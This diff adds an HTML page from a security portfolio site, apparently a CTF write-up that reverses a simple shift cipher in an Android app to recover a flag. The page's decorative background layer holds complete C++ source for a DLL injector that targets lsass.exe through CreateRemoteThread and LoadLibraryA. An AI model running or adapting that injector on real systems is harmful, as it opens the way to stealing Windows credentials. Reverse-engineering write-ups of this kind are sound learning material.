@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>rev-weird-app</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="rev-weird-app" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>rev-weird-app</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h1 id="rev-weird-app">rev-weird-app</h1>
+
+<p><strong>Category:</strong> Reverse Engineering<br />
+<strong>Attachment:</strong> <a href="./assets/img/ctf_assets/rev-weird.zip">/assets/img/ctf_assets/rev-weird.zip</a></p>
+
+<hr />
+
+<h2 id="challenge-description">Challenge Description</h2>
+<p>We are given an attachment containing a suspicious file. The goal is to recover the original flag hidden inside the app.</p>
+
+<hr />
+
+<h2 id="step-1-extracting-the-attachment">Step 1: Extracting the Attachment</h2>
+<p>The provided attachment contained a simple <code class="language-plaintext highlighter-rouge">.apk</code> file.</p>
+
+<p><strong>Place this image here:</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>![Jumbled Flag](./assets/img/ctf_assets/imag-apk.jpeg)
+</code></pre></div></div>
+<p><em>This image shows the extracted <code class="language-plaintext highlighter-rouge">.apk</code> file.</em></p>
+
+<hr />
+
+<h2 id="step-2-inspecting-the-apk">Step 2: Inspecting the APK</h2>
+<p>Opening the <code class="language-plaintext highlighter-rouge">.apk</code> file using <strong>Jadx</strong> revealed obfuscated Kotlin code. In the <code class="language-plaintext highlighter-rouge">MainActivity</code> file, we found the following:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">final</span> <span class="nc">String</span> <span class="n">transformedFlag</span> <span class="o">=</span> <span class="nc">MainActivityKt</span><span class="o">.</span><span class="na">transformFlag</span><span class="o">(</span><span class="s">"REDACTED"</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">transformFlag()</code> function was clearly responsible for encrypting the original flag before displaying it.</p>
+
+<hr />
+
+<h2 id="step-3-encryption-logic">Step 3: Encryption Logic</h2>
+<p>Here is the transformation function inside the app:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="nf">transformFlag</span><span class="o">(</span><span class="nc">String</span> <span class="n">flag</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="n">res</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
+    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">flag</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+        <span class="c1">// Letters</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">c</span> <span class="o">&lt;</span> <span class="s">"abcdefghijklmnopqrstuvwxyz"</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">c</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="s">"abcdefghijklmnopqrstuvwxyz"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">c</span><span class="o">)</span> <span class="o">==</span> <span class="n">flag</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                <span class="kt">int</span> <span class="n">ind</span> <span class="o">=</span> <span class="n">c</span> <span class="o">+</span> <span class="n">i</span><span class="o">;</span>
+                <span class="n">res</span> <span class="o">=</span> <span class="n">res</span> <span class="o">+</span> <span class="s">"abcdefghijklmnopqrstuvwxyz"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">ind</span> <span class="o">%</span> <span class="mi">26</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="c1">// Digits</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">c2</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">c2</span> <span class="o">&lt;</span> <span class="s">"0123456789"</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">c2</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="s">"0123456789"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">c2</span><span class="o">)</span> <span class="o">==</span> <span class="n">flag</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                <span class="kt">int</span> <span class="n">ind2</span> <span class="o">=</span> <span class="o">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="o">)</span> <span class="o">+</span> <span class="n">c2</span><span class="o">;</span>
+                <span class="n">res</span> <span class="o">=</span> <span class="n">res</span> <span class="o">+</span> <span class="s">"0123456789"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">ind2</span> <span class="o">%</span> <span class="mi">10</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="c1">// Symbols</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">c3</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">c3</span> <span class="o">&lt;</span> <span class="s">"!@#$%^&amp;*()_+{}[]|"</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="n">c3</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="s">"!@#$%^&amp;*()_+{}[]|"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">c3</span><span class="o">)</span> <span class="o">==</span> <span class="n">flag</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">))</span> <span class="o">{</span>
+                <span class="kt">int</span> <span class="n">ind3</span> <span class="o">=</span> <span class="o">(</span><span class="n">i</span> <span class="o">*</span> <span class="n">i</span><span class="o">)</span> <span class="o">+</span> <span class="n">c3</span><span class="o">;</span>
+                <span class="n">res</span> <span class="o">=</span> <span class="n">res</span> <span class="o">+</span> <span class="s">"!@#$%^&amp;*()_+{}[]|"</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">ind3</span> <span class="o">%</span> <span class="mi">17</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">res</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>This function performs the following <strong>encryption</strong>:</p>
+
+<ul>
+  <li><strong>Letters:</strong> <code class="language-plaintext highlighter-rouge">new_index = (old_index + i) % 26</code></li>
+  <li><strong>Digits:</strong> <code class="language-plaintext highlighter-rouge">new_index = (old_index + 2*i) % 10</code></li>
+  <li><strong>Symbols:</strong> <code class="language-plaintext highlighter-rouge">new_index = (old_index + i*i) % len(symbols)</code></li>
+</ul>
+
+<hr />
+
+<h2 id="step-4-decryption-formulas">Step 4: Decryption Formulas</h2>
+<p>To recover the original flag, we reverse the transformation:</p>
+
+<ul>
+  <li><strong>Letters:</strong> <code class="language-plaintext highlighter-rouge">old_index = (new_index - i) % 26</code></li>
+  <li><strong>Digits:</strong> <code class="language-plaintext highlighter-rouge">old_index = (new_index - 2*i) % 10</code></li>
+  <li><strong>Symbols:</strong> <code class="language-plaintext highlighter-rouge">old_index = (new_index - i*i + len(symbols)) % len(symbols)</code></li>
+</ul>
+
+<hr />
+
+<h2 id="step-5-given-encrypted-flag">Step 5: Given Encrypted Flag</h2>
+<p>From the Android app:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>idvi+1{s6e3{)arg2zv[moqa905+
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="step-6-manual-decryption">Step 6: Manual Decryption</h2>
+<p>Using the formulas above, we decrypted each character step by step.<br />
+Here is the table of calculations:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Index (i)</th>
+      <th>Encrypted Char</th>
+      <th>Type</th>
+      <th>Formula Applied</th>
+      <th>Decrypted Char</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0</td>
+      <td>i</td>
+      <td>Letter</td>
+      <td>(8 - 0) % 26 = 8 → i</td>
+      <td>i</td>
+    </tr>
+    <tr>
+      <td>1</td>
+      <td>d</td>
+      <td>Letter</td>
+      <td>(3 - 1) % 26 = 2 → c</td>
+      <td>c</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>v</td>
+      <td>Letter</td>
+      <td>(21 - 2) % 26 = 19 → t</td>
+      <td>t</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>i</td>
+      <td>Letter</td>
+      <td>(8 - 3) % 26 = 5 → f</td>
+      <td>f</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>+</td>
+      <td>Symbol</td>
+      <td>(11 - 16 + 17) % 17 = 12 → {</td>
+      <td>{</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>1</td>
+      <td>Digit</td>
+      <td>(1 - 10) % 10 = 1</td>
+      <td>1</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>{</td>
+      <td>Symbol</td>
+      <td>(12 - 36 + 17) % 17 = 10 → _</td>
+      <td>_</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>s</td>
+      <td>Letter</td>
+      <td>(18 - 7) % 26 = 11 → l</td>
+      <td>l</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>6</td>
+      <td>Digit</td>
+      <td>(6 - 16) % 10 = 0</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>e</td>
+      <td>Letter</td>
+      <td>(4 - 9) % 26 = 21 → v</td>
+      <td>v</td>
+    </tr>
+    <tr>
+      <td>10</td>
+      <td>3</td>
+      <td>Digit</td>
+      <td>(3 - 20) % 10 = 3</td>
+      <td>3</td>
+    </tr>
+    <tr>
+      <td>11</td>
+      <td>{</td>
+      <td>Symbol</td>
+      <td>(12 - 121 + 17) % 17 = 10 → _</td>
+      <td>_</td>
+    </tr>
+    <tr>
+      <td>12</td>
+      <td>)</td>
+      <td>Symbol</td>
+      <td>(9 - 144 + 17) % 17 = 1 → @</td>
+      <td>@</td>
+    </tr>
+    <tr>
+      <td>13</td>
+      <td>a</td>
+      <td>Letter</td>
+      <td>(0 - 13) % 26 = 13 → n</td>
+      <td>n</td>
+    </tr>
+    <tr>
+      <td>14</td>
+      <td>r</td>
+      <td>Letter</td>
+      <td>(17 - 14) % 26 = 3 → d</td>
+      <td>d</td>
+    </tr>
+    <tr>
+      <td>15</td>
+      <td>g</td>
+      <td>Letter</td>
+      <td>(6 - 15) % 26 = 17 → r</td>
+      <td>r</td>
+    </tr>
+    <tr>
+      <td>16</td>
+      <td>2</td>
+      <td>Digit</td>
+      <td>(2 - 32) % 10 = 0</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>17</td>
+      <td>z</td>
+      <td>Letter</td>
+      <td>(25 - 17) % 26 = 8 → i</td>
+      <td>i</td>
+    </tr>
+    <tr>
+      <td>18</td>
+      <td>v</td>
+      <td>Letter</td>
+      <td>(21 - 18) % 26 = 3 → d</td>
+      <td>d</td>
+    </tr>
+    <tr>
+      <td>19</td>
+      <td>[</td>
+      <td>Symbol</td>
+      <td>(14 - 361 + 17) % 17 = 10 → _</td>
+      <td>_</td>
+    </tr>
+    <tr>
+      <td>20</td>
+      <td>m</td>
+      <td>Letter</td>
+      <td>(12 - 20) % 26 = 18 → s</td>
+      <td>s</td>
+    </tr>
+    <tr>
+      <td>21</td>
+      <td>o</td>
+      <td>Letter</td>
+      <td>(14 - 21) % 26 = 19 → t</td>
+      <td>t</td>
+    </tr>
+    <tr>
+      <td>22</td>
+      <td>q</td>
+      <td>Letter</td>
+      <td>(16 - 22) % 26 = 20 → u</td>
+      <td>u</td>
+    </tr>
+    <tr>
+      <td>23</td>
+      <td>a</td>
+      <td>Letter</td>
+      <td>(0 - 23) % 26 = 3 → d</td>
+      <td>d</td>
+    </tr>
+    <tr>
+      <td>24</td>
+      <td>9</td>
+      <td>Digit</td>
+      <td>(9 - 48) % 10 = 1</td>
+      <td>1</td>
+    </tr>
+    <tr>
+      <td>25</td>
+      <td>0</td>
+      <td>Digit</td>
+      <td>(0 - 50) % 10 = 0</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>26</td>
+      <td>5</td>
+      <td>Digit</td>
+      <td>(5 - 52) % 10 = 3</td>
+      <td>3</td>
+    </tr>
+    <tr>
+      <td>27</td>
+      <td>+</td>
+      <td>Symbol</td>
+      <td>(11 - 729 + 17) % 17 = 13 → }</td>
+      <td>}</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="step-7-recovered-flag">Step 7: Recovered Flag</h2>
+<p>Combining all decrypted characters:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ictf{1_l0v3_@ndr0id_stud103}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="final-flag">Final Flag</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ictf{1_l0v3_@ndr0id_stud103}
+</code></pre></div></div>
+
+<hr />
+
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
